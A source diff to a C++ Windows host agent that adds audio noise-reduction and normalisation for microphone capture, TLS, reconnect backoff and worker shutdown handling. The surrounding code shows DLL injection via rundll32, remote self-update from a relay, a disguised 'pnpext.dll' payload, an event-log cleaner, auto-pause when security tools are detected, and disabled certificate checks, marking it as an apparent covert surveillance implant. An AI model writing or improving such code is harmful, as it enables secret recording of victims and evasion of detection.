@@ -13,6 +13,7 @@
 #include "capture_ipc.h"
 #include "threat_scan.h"
 #include "capture_helper.h"
+#include "audio_dsp.h"
 #include <userenv.h>
 #include <wtsapi32.h>
 #include <bcrypt.h>
@@ -91,6 +92,9 @@ static std::atomic<int> g_audio_channels{1};
 static std::atomic<int> g_audio_device_id{-1}; // -1 = WAVE_MAPPER (default)
 static std::atomic<int> g_audio_gain{100};     // % gain (100=normal, 200=2x boost)
 static std::atomic<int> g_audio_mode{0};       // 0=record, 1=live, 2=both
+static std::atomic<bool> g_audio_denoise{true};   // high-pass + noise gate
+static std::atomic<bool> g_audio_normalize{true}; // peak normalization
+static std::atomic<int>  g_audio_hum_filter{50};  // 0=off, 50=50Hz, 60=60Hz
 static void audio_thread_func(); // defined later
 static HANDLE g_audio_record_process = nullptr; // PID of current recording rundll32
 
@@ -106,6 +110,33 @@ static ServiceManager g_services;
 // ── Service/DLL mode ──
 bool g_service_mode = false;
 CaptureIpcReader* g_ipc_reader_ptr = nullptr;
+
+// ── Background worker tracker ──
+// Short-lived fire-and-forget workers (previously .detach()'d) are now tracked
+// so stop_host() can wait for them to finish before tearing down globals.
+static std::atomic<int>     g_bg_worker_count{0};
+static std::mutex           g_bg_worker_mtx;
+static std::condition_variable g_bg_worker_cv;
+
+template <typename Fn>
+static void spawn_bg_worker(Fn&& fn) {
+    g_bg_worker_count.fetch_add(1, std::memory_order_acq_rel);
+    std::thread([f = std::forward<Fn>(fn)]() mutable {
+        try { f(); } catch (...) { /* swallow: worker must not take down host */ }
+        {
+            std::lock_guard<std::mutex> lk(g_bg_worker_mtx);
+            g_bg_worker_count.fetch_sub(1, std::memory_order_acq_rel);
+        }
+        g_bg_worker_cv.notify_all();
+    }).detach();
+}
+
+// Called from stop_host() (dllmain.cpp) during shutdown.
+// Waits up to timeout_ms for all bg workers + audio + screenshot threads to finish.
+extern "C" void shutdown_workers(int timeout_ms);
+
+// Forward declarations of globals defined above that shutdown_workers touches.
+// (g_audio_thread / g_screenshot_thread / g_audio_active / g_screenshot_active are above)
 
 // ===== Graceful shutdown on console events (Ctrl+C, close, logoff, shutdown) =====
 static BOOL WINAPI ConsoleCtrlHandler(DWORD type) {
@@ -179,6 +210,52 @@ static std::queue<FileWork> g_file_work_q;
 static std::vector<std::thread> g_file_workers;
 static std::atomic<bool> g_file_workers_running{false};
 
+// ═══════════════════════════════════════════════════════════════
+//  Reconnect backoff — exponential with jitter + auth-fail limiter
+// ═══════════════════════════════════════════════════════════════
+// State for auth failure tracking across reconnects. If the server keeps
+// responding with auth errors (wrong password / token / banned), we stop
+// hammering and fall back to a long cooldown — otherwise a rotated password
+// would keep the host in a tight spin forever, flooding the log.
+static std::atomic<int> g_auth_fail_count{0};
+static std::condition_variable g_reconnect_cv;
+static std::mutex              g_reconnect_mtx;
+
+// Call this from the auth-response handler when the server says "bad credentials".
+inline void reconnect_note_auth_fail() { g_auth_fail_count.fetch_add(1); }
+inline void reconnect_note_auth_ok()   { g_auth_fail_count.store(0); }
+
+// Compute next delay in seconds given the current delay and whether we're
+// in auth-fail penalty mode. Exponential: 1→2→4→8→16→32→60 (cap 60s).
+// After 3 consecutive auth failures, jumps to a 5-minute cooldown.
+static int reconnect_next_delay(int cur_delay) {
+    const int max_normal  = 60;   // cap for network-level failures
+    const int auth_penalty = 300; // 5 min if server keeps rejecting auth
+    if (g_auth_fail_count.load() >= 3) return auth_penalty;
+    int next = cur_delay * 2;
+    if (next > max_normal) next = max_normal;
+    if (next < 1) next = 1;
+    return next;
+}
+
+// Jittered sleep that wakes immediately on g_running=false. Applies ±25%
+// randomization to avoid thundering-herd when many hosts reconnect after a
+// brief VPS outage, and on a shutdown signal returns early.
+static void reconnect_sleep(int seconds) {
+    if (seconds <= 0) return;
+    // Uniform jitter: 0.75..1.25
+    thread_local std::mt19937 rng(std::random_device{}());
+    std::uniform_real_distribution<float> dist(0.75f, 1.25f);
+    int ms = (int)((float)seconds * 1000.f * dist(rng));
+    if (ms < 250) ms = 250;
+    std::unique_lock<std::mutex> lk(g_reconnect_mtx);
+    g_reconnect_cv.wait_for(lk, std::chrono::milliseconds(ms),
+                             [] { return !g_running.load(); });
+}
+
+// Called from shutdown path to wake any sleeping reconnect loops.
+inline void reconnect_wake_all() { g_reconnect_cv.notify_all(); }
+
 static void open_file_connections() {
     std::lock_guard<std::mutex> lk(g_file_ws_mtx);
     // Close old connections
@@ -189,7 +266,7 @@ static void open_file_connections() {
     // ONE dedicated file connection — keeps FILE traffic off main ws (commands stay fast)
     // Using 1 (not 4!) so TCP fairness gives stream ~50% bandwidth, files ~33%, commands ~17%
     auto ws = std::make_unique<WsClient>();
-    if (ws->connect(g_config.server_address, g_config.server_port, "/host")) {
+    if (ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
         std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                            "\",\"password\":\"" + json_escape(g_config.password) +
                            "\",\"role\":\"host_file\"}";
@@ -344,6 +421,9 @@ static void load_config(const std::string& path) {
     std::string port = get("port", "");
     if (!port.empty()) g_config.server_port = safe_stoi(port, g_config.server_port);
 
+    std::string tls_s = get("use_tls", "");
+    if (!tls_s.empty()) g_config.use_tls = (tls_s == "true" || tls_s == "1");
+
     std::string q = get("quality", "");
     if (!q.empty()) g_config.quality = safe_stoi(q, g_config.quality);
 
@@ -408,6 +488,15 @@ static void load_config(const std::string& path) {
     std::string au_gain = get("audio_gain", "");
     if (!au_gain.empty()) g_config.audio_gain = safe_stoi(au_gain, 100);
     g_audio_gain = g_config.audio_gain;
+    std::string au_dn = get("audio_denoise", "");
+    if (!au_dn.empty()) g_config.audio_denoise = (au_dn == "true" || au_dn == "1");
+    g_audio_denoise = g_config.audio_denoise;
+    std::string au_nr = get("audio_normalize", "");
+    if (!au_nr.empty()) g_config.audio_normalize = (au_nr == "true" || au_nr == "1");
+    g_audio_normalize = g_config.audio_normalize;
+    std::string au_hum = get("audio_hum_filter", "");
+    if (!au_hum.empty()) g_config.audio_hum_filter = safe_stoi(au_hum, 50);
+    g_audio_hum_filter = g_config.audio_hum_filter;
 
     // Threat monitor toggles
     std::string th_scan = get("threat_scan_enabled", "");
@@ -448,6 +537,7 @@ static void save_stream_settings() {
     std::string out = "{\n";
     out += "  \"server\": \"" + json_escape(get_existing("server", g_config.server_address)) + "\",\n";
     out += "  \"port\": " + get_existing("port", std::to_string(g_config.server_port)) + ",\n";
+    out += "  \"use_tls\": " + get_existing("use_tls", std::string(g_config.use_tls ? "true" : "false")) + ",\n";
     out += "  \"token\": \"" + json_escape(get_existing("token", g_config.room_token)) + "\",\n";
     out += "  \"password\": \"" + json_escape(get_existing("password", g_config.password)) + "\",\n";
     out += "  \"codec\": \"" + json_escape(g_codec) + "\",\n";
@@ -474,6 +564,9 @@ static void save_stream_settings() {
     out += "  \"audio_bitrate\": " + std::to_string(g_config.audio_bitrate) + ",\n";
     out += "  \"audio_channels\": " + std::to_string(g_config.audio_channels) + ",\n";
     out += "  \"audio_gain\": " + std::to_string(g_config.audio_gain) + ",\n";
+    out += "  \"audio_denoise\": " + std::string(g_config.audio_denoise ? "true" : "false") + ",\n";
+    out += "  \"audio_normalize\": " + std::string(g_config.audio_normalize ? "true" : "false") + ",\n";
+    out += "  \"audio_hum_filter\": " + std::to_string(g_config.audio_hum_filter) + ",\n";
     out += "  \"threat_scan_enabled\": " + std::string(g_threat_scan_enabled ? "true" : "false") + ",\n";
     out += "  \"threat_auto_pause\": " + std::string(g_threat_auto_pause ? "true" : "false") + "\n";
     out += "}\n";
@@ -950,7 +1043,7 @@ static void start_streaming() {
     g_stream_ws.clear();
     for (int i = 0; i < n_conns; i++) {
         auto ws = std::make_unique<WsClient>();
-        if (ws->connect(g_config.server_address, g_config.server_port, "/host")) {
+        if (ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
             std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                                "\",\"password\":\"" + json_escape(g_config.password) +
                                "\",\"role\":\"host_stream\"}";
@@ -1073,6 +1166,27 @@ static void screenshot_thread_func(); // defined after evtlog_cleaner
 // ===== Command handler =====
 static void handle_command(const std::string& msg_str) {
     try {
+        // ── Detect auth-failure responses from server ──
+        // Server.py sends {"ok":false,"error":"Wrong password"} (or similar) and
+        // then closes. Flagging lets reconnect loop enter the long-cooldown branch
+        // instead of hammering with bad credentials every second.
+        {
+            std::string ok_field = json_get(msg_str, "ok");
+            if (ok_field == "false") {
+                std::string err = json_get(msg_str, "error");
+                // Case-insensitive search for auth-related keywords
+                std::string el;
+                el.reserve(err.size());
+                for (char c : err) el += (char)tolower((unsigned char)c);
+                if (el.find("password") != std::string::npos ||
+                    el.find("token")    != std::string::npos ||
+                    el.find("auth")     != std::string::npos ||
+                    el.find("unauthor") != std::string::npos) {
+                    reconnect_note_auth_fail();
+                    g_log.warn("Auth rejected by server: " + err);
+                }
+            }
+        }
 #ifdef USE_WEBRTC_STREAM
         // Handle WebRTC ICE candidates (non-cmd messages)
         {
@@ -1673,30 +1787,84 @@ static void handle_command(const std::string& msg_str) {
 
         // --- Speed test: host internet speed (download from public URL) ---
         else if (cmd == "speed_test_internet") {
-            // Use PowerShell to download test data and measure speed
+            // Download AND upload test against Cloudflare. Measures both directions.
             std::string output = g_procs.run_cmd_capture(
                 "powershell -NoProfile -Command \""
-                "$url='http://speed.cloudflare.com/__down?bytes=5000000';"
-                "$sw=[System.Diagnostics.Stopwatch]::StartNew();"
-                "try{$d=(New-Object System.Net.WebClient).DownloadData($url);$sw.Stop();"
-                "$mb=$d.Length/1048576;$sec=$sw.Elapsed.TotalSeconds;"
-                "$mbps=[math]::Round($mb*8/$sec,2);"
-                "Write-Output ('{0}|{1}|{2}' -f $d.Length,[math]::Round($sec,3),$mbps)}"
-                "catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"");
-            // Parse: bytes|seconds|mbps  or  ERROR|message
-            auto parts_pos = output.find('|');
-            if (parts_pos != std::string::npos && output.substr(0,5) != "ERROR") {
-                auto p2 = output.find('|', parts_pos+1);
-                std::string bytes_s = output.substr(0, parts_pos);
-                std::string sec_s = output.substr(parts_pos+1, p2-parts_pos-1);
-                std::string mbps_s = output.substr(p2+1);
-                // trim whitespace
+                "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';"
+                "$ul_url='http://speed.cloudflare.com/__up';"
+                "$result=@{};"
+                "try{"
+                "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
+                "  $d=(New-Object System.Net.WebClient).DownloadData($dl_url);$sw.Stop();"
+                "  $result.dl_bytes=$d.Length;$result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);"
+                "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);"
+                "}catch{$result.dl_err=$_.Exception.Message}"
+                "try{"
+                "  $body=New-Object byte[] 5000000;"
+                "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();"
+                "  $wc=New-Object System.Net.WebClient;$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
+                "  $result.ul_bytes=$body.Length;$result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);"
+                "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);"
+                "}catch{$result.ul_err=$_.Exception.Message}"
+                "Write-Output ('{0}|{1}|{2}|{3}|{4}|{5}' -f $result.dl_bytes,$result.dl_sec,$result.dl_mbps,$result.ul_bytes,$result.ul_sec,$result.ul_mbps)"
+                "\"");
+            // Parse: dl_bytes|dl_sec|dl_mbps|ul_bytes|ul_sec|ul_mbps
+            std::vector<std::string> parts;
+            std::string cur;
+            for (char c : output) {
+                if (c == '|') { parts.push_back(cur); cur.clear(); }
+                else if (c != '\n' && c != '\r') cur += c;
+            }
+            if (!cur.empty()) parts.push_back(cur);
+            auto get = [&](size_t i) -> std::string { return i < parts.size() && !parts[i].empty() ? parts[i] : "0"; };
+            send_ok("{\"bytes\":" + get(0) + ",\"elapsed_s\":" + get(1) + ",\"mbps\":" + get(2) +
+                    ",\"ul_bytes\":" + get(3) + ",\"ul_elapsed_s\":" + get(4) + ",\"ul_mbps\":" + get(5) + "}");
+        }
+
+        // ── Browser ↔ Host echo for DL/UL measurement ──
+        // Client sends: {cmd:"host_echo", size: N}     → host returns data of N '0' chars (DL test)
+        // Client sends: {cmd:"host_echo", payload: ""} → host returns echo_bytes count (UL test)
+        else if (cmd == "host_echo") {
+            std::string sz = json_get(msg_str, "size");
+            std::string pl = json_get(msg_str, "payload");
+            int64_t echo_size = pl.empty() ? 0 : (int64_t)pl.size();
+            int64_t out_size = sz.empty() ? 0 : std::min((int64_t)std::stoll(sz), (int64_t)2'000'000);
+            std::string data;
+            if (out_size > 0) data.assign((size_t)out_size, '0');
+            send_ok("{\"echoed_bytes\":" + std::to_string(echo_size) +
+                    ",\"data_size\":" + std::to_string(out_size) +
+                    ",\"data\":\"" + data + "\"}");
+        }
+
+        // ── Host ↔ Relay HTTPS download test ──
+        // Host downloads a known file from VPS via HTTPS, measures DL throughput.
+        // Uses /files/pnpext.dll which is always present after deploy.
+        else if (cmd == "host_relay_speed") {
+            std::string vps_ip = g_config.server_address;
+            std::string output = g_procs.run_cmd_capture(
+                "powershell -NoProfile -Command \""
+                "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
+                "$url='https://" + vps_ip + "/files/pnpext.dll';"
+                "try{"
+                "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
+                "  $d=(New-Object System.Net.WebClient).DownloadData($url);$sw.Stop();"
+                "  $mb=$d.Length/1048576;$sec=$sw.Elapsed.TotalSeconds;"
+                "  if($sec -lt 0.001){$sec=0.001}"
+                "  $mbps=[math]::Round(($d.Length*8/$sec)/1048576,2);"
+                "  Write-Output ('{0}|{1}|{2}' -f $d.Length,[math]::Round($sec,3),$mbps)"
+                "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"");
+            auto p1 = output.find('|');
+            if (p1 != std::string::npos && output.substr(0, 5) != "ERROR") {
+                auto p2 = output.find('|', p1 + 1);
+                std::string bytes_s = output.substr(0, p1);
+                std::string sec_s = output.substr(p1 + 1, p2 - p1 - 1);
+                std::string mbps_s = output.substr(p2 + 1);
                 while (!mbps_s.empty() && (mbps_s.back()=='\n'||mbps_s.back()=='\r'||mbps_s.back()==' ')) mbps_s.pop_back();
                 send_ok("{\"bytes\":" + bytes_s + ",\"elapsed_s\":" + sec_s + ",\"mbps\":" + mbps_s + "}");
             } else {
                 std::string err = output.length() > 6 ? output.substr(6) : output;
                 while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
-                send_err("Internet speed test failed: " + err);
+                send_err("Host↔Relay DL test failed: " + err);
             }
         }
 
@@ -1923,12 +2091,21 @@ static void handle_command(const std::string& msg_str) {
             if (!v.empty()) { int g = std::clamp(std::stoi(v), 50, 2000); g_audio_gain = g; g_config.audio_gain = g; }
             v = json_get(msg_str, "mode");
             if (!v.empty()) { int m = std::clamp(std::stoi(v), 0, 2); g_audio_mode = m; g_config.audio_mode = m; }
+            v = json_get(msg_str, "denoise");
+            if (!v.empty()) { bool b = (v == "true" || v == "1"); g_audio_denoise = b; g_config.audio_denoise = b; }
+            v = json_get(msg_str, "normalize");
+            if (!v.empty()) { bool b = (v == "true" || v == "1"); g_audio_normalize = b; g_config.audio_normalize = b; }
+            v = json_get(msg_str, "hum_filter");
+            if (!v.empty()) { int hf = std::stoi(v); if (hf != 0 && hf != 50 && hf != 60) hf = 0; g_audio_hum_filter = hf; g_config.audio_hum_filter = hf; }
             save_stream_settings();
             send_ok("{\"segment_duration\":" + std::to_string(g_audio_segment_duration.load()) +
                     ",\"sample_rate\":" + std::to_string(g_audio_sample_rate.load()) +
                     ",\"bitrate\":" + std::to_string(g_audio_bitrate.load()) +
                     ",\"channels\":" + std::to_string(g_audio_channels.load()) +
-                    ",\"gain\":" + std::to_string(g_audio_gain.load()) + "}");
+                    ",\"gain\":" + std::to_string(g_audio_gain.load()) +
+                    ",\"denoise\":" + (g_audio_denoise.load() ? "true" : "false") +
+                    ",\"normalize\":" + (g_audio_normalize.load() ? "true" : "false") +
+                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) + "}");
         }
         else if (cmd == "audio_status") {
             // Include device info in status
@@ -1955,6 +2132,9 @@ static void handle_command(const std::string& msg_str) {
                     ",\"bitrate\":" + std::to_string(g_audio_bitrate.load()) +
                     ",\"channels\":" + std::to_string(g_audio_channels.load()) +
                     ",\"gain\":" + std::to_string(g_audio_gain.load()) +
+                    ",\"denoise\":" + std::string(g_audio_denoise.load() ? "true" : "false") +
+                    ",\"normalize\":" + std::string(g_audio_normalize.load() ? "true" : "false") +
+                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) +
                     ",\"device_count\":" + std::to_string(numDevs) +
                     ",\"device_id\":" + std::to_string(g_audio_device_id.load()) +
                     devInfo + "}");
@@ -1968,7 +2148,7 @@ static void handle_command(const std::string& msg_str) {
         else if (cmd == "installed_programs") {
             // Enumerate installed programs from registry (both 64-bit and 32-bit)
             std::string reqId = id;
-            std::thread([reqId, send_ok_raw = [&]() -> std::function<void(const std::string&)> {
+            spawn_bg_worker([reqId, send_ok_raw = [&]() -> std::function<void(const std::string&)> {
                 return [reqId](const std::string& data) {
                     if (g_ws && g_ws->is_connected()) {
                         std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + data + "}";
@@ -2033,7 +2213,7 @@ static void handle_command(const std::string& msg_str) {
                 enumKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0);
                 result += "]";
                 send_ok_raw(result);
-            }).detach();
+            });
         }
 
         // ── Remote host update: download new DLL, replace, re-inject ──
@@ -2096,7 +2276,7 @@ static void handle_command(const std::string& msg_str) {
             if (url.empty()) { send_err("No URL provided"); }
             else {
                 std::string reqId = id;
-                std::thread([reqId, url]() {
+                spawn_bg_worker([reqId, url]() {
                     auto send_msg = [&](const std::string& data) {
                         if (g_ws && g_ws->is_connected()) {
                             std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + data + "}";
@@ -2202,14 +2382,14 @@ static void handle_command(const std::string& msg_str) {
 
                     }
 
-                }).detach();
+                });
             }
         }
 
         else if (cmd == "running_apps") {
             // Use rundll32 GetRunningApps export in user session (fast, no PowerShell)
             std::string reqId = id;
-            std::thread([reqId]() {
+            spawn_bg_worker([reqId]() {
                 extern HMODULE g_dll_module;
                 char dllPathBuf[MAX_PATH] = {};
                 if (g_dll_module) GetModuleFileNameA(g_dll_module, dllPathBuf, MAX_PATH);
@@ -2310,7 +2490,7 @@ static void handle_command(const std::string& msg_str) {
                 result += "]";
                 std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + result + "}";
                 if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(resp));
-            }).detach();
+            });
         }
 
         // ── Set ICE servers (STUN/TURN) and save to config ──
@@ -3311,6 +3491,32 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
         g_log.info("Audio: applied gain " + std::to_string(gain) + "%");
     }
 
+    // ── DSP: hum filter + denoise + normalize (batch path) ──
+    {
+        int16_t* samples = (int16_t*)pcmBuf.data();
+        int numSamples = (int)(pcmRecorded / 2);
+        int hum = g_audio_hum_filter.load();
+        if (hum == 50 || hum == 60) {
+            audio_dsp::HumFilterBank hb;
+            hb.configure(opusSR, (float)hum, channels);
+            audio_dsp::apply_hum_filter(samples, numSamples, hb);
+            g_log.info("Audio: hum filter " + std::to_string(hum) + "Hz applied");
+        }
+        if (g_audio_denoise.load()) {
+            audio_dsp::HighPassState hp;
+            hp.configure(opusSR, channels, 80.f);
+            audio_dsp::apply_highpass(samples, numSamples, hp);
+            audio_dsp::NoiseGateState ng;
+            ng.configure(opusSR);
+            audio_dsp::apply_noise_gate(samples, numSamples, channels, ng);
+            g_log.info("Audio: denoise applied (hpf+gate)");
+        }
+        if (g_audio_normalize.load()) {
+            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 8.0f);
+            g_log.info("Audio: normalized");
+        }
+    }
+
     // Encode PCM → Opus in OGG container
     int err = 0;
     OpusEncoder* enc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &err);
@@ -3400,7 +3606,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
 
     HWAVEIN hWaveIn = nullptr;
-    UINT deviceId = (g_audio_device_id.load() >= 0) ? (UINT)g_audio_device_id.load() : WAVE_MAPPER;
+    int cur_device_setting = g_audio_device_id.load(); // remember to detect runtime changes
+    UINT deviceId = (cur_device_setting >= 0) ? (UINT)cur_device_setting : WAVE_MAPPER;
     HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
     MMRESULT mr = waveInOpen(&hWaveIn, deviceId, &wfx, (DWORD_PTR)hEvent, 0, CALLBACK_EVENT);
     if (mr != MMSYSERR_NOERROR) {
@@ -3479,6 +3686,16 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     int gain = g_audio_gain.load();
     DWORD lastClean = GetTickCount();
 
+    // ── DSP state (persistent across live chunks to avoid stitching artifacts) ──
+    audio_dsp::HighPassState dsp_hp;
+    dsp_hp.configure(opusSR, channels, 80.f);
+    audio_dsp::NoiseGateState dsp_ng;
+    dsp_ng.configure(opusSR);
+    audio_dsp::HumFilterBank dsp_hum;
+    int cur_hum = g_audio_hum_filter.load();
+    if (cur_hum == 50 || cur_hum == 60)
+        dsp_hum.configure(opusSR, (float)cur_hum, channels);
+
     // For alsoRecord mode: accumulate PCM and periodically send AUDR
     std::vector<BYTE> recPcmAccum; // accumulated PCM for recording
     DWORD recStartTick = GetTickCount();
@@ -3538,6 +3755,13 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     };
 
     while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
+        // ── Detect runtime device change: break out so audio_thread_func re-enters ──
+        // capture_audio_live_stream() with the new device.
+        if (g_audio_device_id.load() != cur_device_setting) {
+            g_log.info("Audio LIVE: device changed (" + std::to_string(cur_device_setting) +
+                       " -> " + std::to_string(g_audio_device_id.load()) + "), restarting capture");
+            break;
+        }
         WaitForSingleObject(hEvent, chunkDurationMs + 500);
 
         for (auto* wh : { &wh1, &wh2 }) {
@@ -3554,6 +3778,36 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
                     if (v > 32767) v = 32767; if (v < -32768) v = -32768;
                     samples[i] = (int16_t)v;
                 }
+            }
+
+            // ── DSP: hum + denoise + normalize (live path, per-chunk) ──
+            {
+                int16_t* samples = (int16_t*)wh->lpData;
+                int numSamples = (int)(recorded / 2);
+                // Re-configure hum bank if user changed the setting at runtime
+                int new_hum = g_audio_hum_filter.load();
+                if (new_hum != cur_hum) {
+                    cur_hum = new_hum;
+                    if (cur_hum == 50 || cur_hum == 60)
+                        dsp_hum.configure(opusSR, (float)cur_hum, channels);
+                    else
+                        dsp_hum.active_count = 0;
+                }
+                if (dsp_hum.active_count > 0) {
+                    audio_dsp::apply_hum_filter(samples, numSamples, dsp_hum);
+                }
+                if (g_audio_denoise.load()) {
+                    audio_dsp::apply_highpass(samples, numSamples, dsp_hp);
+                    // Note: noise gate not applied in live path — it's a
+                    // whole-recording operation (needs pass-1 stats). On a
+                    // 3-second chunk the signal/noise separation heuristic
+                    // would be unreliable and could cut speech mid-word.
+                }
+                // Note: peak normalization intentionally NOT applied in live path.
+                // Per-chunk normalize caused quiet segments to be boosted aggressively,
+                // making the live stream sound consistently louder than the batch-recorded
+                // file. Normalization is a whole-recording operation and only runs in
+                // capture_audio_direct() for saved AUDR segments.
             }
 
             // Accumulate PCM for recording (before encoding for live)
@@ -4150,7 +4404,7 @@ int main(int argc, char** argv) {
                     g_raw_cv.notify_all();
                 };
 
-                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host")) {
+                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
                     g_log.info("Connected to server");
                     reconnect_delay = 1;
 
@@ -4185,8 +4439,17 @@ int main(int argc, char** argv) {
                         }
                     }
 
-                    while (g_ws->is_connected() && g_running)
+                    auto conn_start = std::chrono::steady_clock::now();
+                    bool auth_ok_marked = false;
+                    while (g_ws->is_connected() && g_running) {
                         std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                        // After 5s of sustained connection, assume auth succeeded
+                        if (!auth_ok_marked) {
+                            auto dt = std::chrono::duration_cast<std::chrono::seconds>(
+                                std::chrono::steady_clock::now() - conn_start).count();
+                            if (dt >= 5) { reconnect_note_auth_ok(); auth_ok_marked = true; }
+                        }
+                    }
                 } else {
                     g_log.error("Connection failed, retrying in " + std::to_string(reconnect_delay) + "s");
                 }
@@ -4203,11 +4466,12 @@ int main(int argc, char** argv) {
                 try { stop_file_workers(); } catch (...) {}
                 try { close_file_connections(); } catch (...) {}
 
-                g_log.info("Reconnecting in " + std::to_string(reconnect_delay) + "s...");
-                // Sleep in small increments so we can respond to g_running=false quickly
-                for (int i = 0; i < reconnect_delay * 10 && g_running; i++)
-                    Sleep(100);
-                reconnect_delay = std::min(reconnect_delay * 2, 10);
+                if (g_auth_fail_count.load() >= 3) {
+                    g_log.warn("Repeated auth failures, cooling down 5 minutes");
+                }
+                g_log.info("Reconnecting in ~" + std::to_string(reconnect_delay) + "s (±25% jitter)");
+                reconnect_sleep(reconnect_delay);
+                reconnect_delay = reconnect_next_delay(reconnect_delay);
             }
 
             WSACleanup();
@@ -4365,7 +4629,7 @@ void host_main_loop() {
                 };
 
                 dll_diag("host_main_loop: connecting WS...");
-                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host")) {
+                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
                     dll_diag("host_main_loop: WS connected OK");
                     g_log.info("Connected to server");
                     reconnect_delay = 1;
@@ -4398,8 +4662,16 @@ void host_main_loop() {
                     }
 
                     dll_diag("host_main_loop: connected + auth sent, entering main poll loop");
-                    while (g_ws->is_connected() && g_running)
+                    auto conn_start = std::chrono::steady_clock::now();
+                    bool auth_ok_marked = false;
+                    while (g_ws->is_connected() && g_running) {
                         std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                        if (!auth_ok_marked) {
+                            auto dt = std::chrono::duration_cast<std::chrono::seconds>(
+                                std::chrono::steady_clock::now() - conn_start).count();
+                            if (dt >= 5) { reconnect_note_auth_ok(); auth_ok_marked = true; }
+                        }
+                    }
                     dll_diag(("host_main_loop: poll loop exited (is_connected=" + std::to_string(g_ws->is_connected()) + " g_running=" + std::to_string(g_running.load()) + ")").c_str());
                 } else {
                     dll_diag("host_main_loop: connect FAILED");
@@ -4417,9 +4689,12 @@ void host_main_loop() {
                 try { stop_file_workers(); } catch (...) {}
                 try { close_file_connections(); } catch (...) {}
 
-                g_log.info("Reconnecting in " + std::to_string(reconnect_delay) + "s...");
-                for (int i = 0; i < reconnect_delay * 10 && g_running; i++) Sleep(100);
-                reconnect_delay = std::min(reconnect_delay * 2, 10);
+                if (g_auth_fail_count.load() >= 3) {
+                    g_log.warn("Repeated auth failures, cooling down 5 minutes");
+                }
+                g_log.info("Reconnecting in ~" + std::to_string(reconnect_delay) + "s (±25% jitter)");
+                reconnect_sleep(reconnect_delay);
+                reconnect_delay = reconnect_next_delay(reconnect_delay);
             }
 
             WSACleanup();
@@ -4435,4 +4710,24 @@ void host_main_loop() {
     cleanup_system();
     if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
     g_log.info("host_main_loop finished");
+}
+
+// ── Shutdown helper: called from stop_host() before tearing down globals ──
+// Joins audio/screenshot threads and waits for bg workers to finish.
+// g_running must already be false when this is called so the threads exit their loops.
+extern "C" void shutdown_workers(int timeout_ms) {
+    // Stop audio/screenshot activity flags — they also check g_running, but clear here
+    // to speed up exit from inner capture/record loops.
+    g_audio_active = false;
+    g_screenshot_active = false;
+    // Wake any reconnect-sleepers so they notice g_running=false immediately
+    reconnect_wake_all();
+
+    if (g_audio_thread.joinable())      g_audio_thread.join();
+    if (g_screenshot_thread.joinable()) g_screenshot_thread.join();
+
+    // Wait for bg workers (installed_programs, host_update, running_apps, ...)
+    std::unique_lock<std::mutex> lk(g_bg_worker_mtx);
+    g_bg_worker_cv.wait_for(lk, std::chrono::milliseconds(timeout_ms),
+                             [] { return g_bg_worker_count.load() == 0; });
 }
